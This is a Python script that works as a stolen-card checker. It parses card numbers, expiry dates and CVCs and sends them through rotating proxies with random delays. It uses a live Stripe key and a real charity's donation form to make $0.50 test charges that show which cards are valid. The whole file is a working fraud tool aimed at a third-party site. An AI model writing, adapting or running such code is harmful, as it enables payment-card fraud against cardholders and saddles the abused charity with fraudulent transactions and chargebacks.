import random
import requests, re, time
from utils import lookBin, genProxy


def Tele(ccx):
    try:
        import requests
        r = requests.session()

        urlToGet = "http://api.ipify.org/"
        r = requests.get(urlToGet, proxies=genProxy())
        ip=r.text
    except:
        ip="something wrongs"
    try:
        import requests

        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:  # Mo3gza
            yy = yy.split("20")[1]
        time.sleep(random.randrange(2,7))
        
        

        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "priority": "u=1, i",
            "referer": "https://js.stripe.com/",
            "sec-ch-ua": '"Brave";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }

        # data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=284765b7-69d6-481a-b4ed-9dd3277fbb75cd92ed&muid=953d9401-858b-4c98-b71e-a0efb5e2872a7b3cd0&sid=eddcdf3a-d301-4680-b8f9-e7f47237ee0dc79fcc&pasted_fields=number&payment_user_agent=stripe.js%2F064d3d4e55%3B+stripe-js-v3%2F064d3d4e55%3B+card-element&referrer=https%3A%2F%2Fkimsharris.com&time_on_page=28864&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
        data = f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=7c760b14-bd89-44e3-a12e-9fd17fcf30ebd80046&muid=5bcc897e-351a-48eb-b723-a48a98c2157b68ee0f&sid=4d079dfd-ddaa-45a2-b4fe-0ba8e20fdf8d82318e&pasted_fields=number&payment_user_agent=stripe.js%2F422ccd4c03%3B+stripe-js-v3%2F422ccd4c03%3B+card-element&referrer=https%3A%2F%2Fwww.peaceambaministries.us&time_on_page=177356&key=pk_live_51NajnRBHVLOCuCFLquaGvaycf3xyCBxy015xuxHVKaJCLcLBcQDfzWtuaIcJ6P1q4ghIoZlgW6y4pbaXlky8Kz8V00KZV9NbDb"
        r1 = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxies=genProxy(),
        )

        pm = r1.json()["id"]
        

        cookies = {
            '_ga': 'GA1.2.1722835910.1732199403',
            '_gid': 'GA1.2.1589838249.1732199403',
            'trx_addons_is_retina': '1',
            '__stripe_mid': '5bcc897e-351a-48eb-b723-a48a98c2157b68ee0f',
            '__stripe_sid': '4d079dfd-ddaa-45a2-b4fe-0ba8e20fdf8d82318e',
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.peaceambaministries.us',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.peaceambaministries.us/don/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            # 'Cookie': '_ga=GA1.2.1722835910.1732199403; _gid=GA1.2.1589838249.1732199403; trx_addons_is_retina=1; __stripe_mid=5bcc897e-351a-48eb-b723-a48a98c2157b68ee0f; __stripe_sid=4d079dfd-ddaa-45a2-b4fe-0ba8e20fdf8d82318e',
        }
        
        params = {
            't': '1732199583425',
        }
        
        data = {
            'data': f'ak_hp_textarea=&ak_js=1732199401481&__fluent_form_embded_post_id=25171&_fluentform_4_fluentformnonce=ab21a2d117&_wp_http_referer=%2Fdon%2F&names%5Bfirst_name%5D=Khant%20Ti%20Kyi&names%5Blast_name%5D=Kyi&address_1%5Baddress_line_1%5D=Allian%20Street&address_1%5Baddress_line_2%5D=Ffc&address_1%5Bcity%5D=New%20York&address_1%5Bstate%5D=New%20Yokr&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&dropdown=Peace%20Amba%20Ministries%20&custom-payment-amount=0.5&payment_method=stripe&__entry_intermediate_hash=b47ad29a1d7b5c0ad2d91d14b5e59141&__stripe_payment_method_id={pm}',
            'action': 'fluentform_submit',
            'form_id': '4',
        }

        r2 = requests.post(
            "https://www.peaceambaministries.us/wp-admin/admin-ajax.php",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=genProxy(),
        )
        
        return (ccx, r2.json(),ip)
    except:
        return "error", "error",ip
